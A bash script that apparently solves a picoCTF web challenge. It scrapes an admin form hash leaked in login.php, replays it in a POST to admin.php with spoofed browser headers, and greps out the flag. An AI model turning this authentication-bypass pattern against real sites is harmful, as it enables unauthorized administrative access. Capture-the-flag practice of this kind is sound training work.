# Clear dump
if [ -d build/ ]
then
    rm -rf build/
fi

mkdir build
pushd build/ > /dev/null

webLink=$1

response=$(curl --silent "$webLink""login.php")
adminHash=$(echo "$response" | grep -o --color=never "adminFormHash.*" | awk '{print $3}' | awk -F "\"" '{print $2}' | tr -dc '[[:print:]]')

response=$(curl --silent "$webLink""admin.php" \
     -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' \
     -H 'Accept-Language: en-US,en;q=0.9' \
     -H 'Cache-Control: max-age=0' \
     -H 'Connection: keep-alive' \
     -H 'Content-Type: application/x-www-form-urlencoded' \
     -H "Origin: $webLink" \
     -H "Referer: $webLink""login.php" \
     -H 'Upgrade-Insecure-Requests: 1' \
     -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36' \
     --data-raw 'hash='$adminHash \
     --compressed \
     --insecure)

flag=$(echo "$response" | grep -o "picoCTF{.*}")

popd > /dev/null

# print the flag
echo $flag
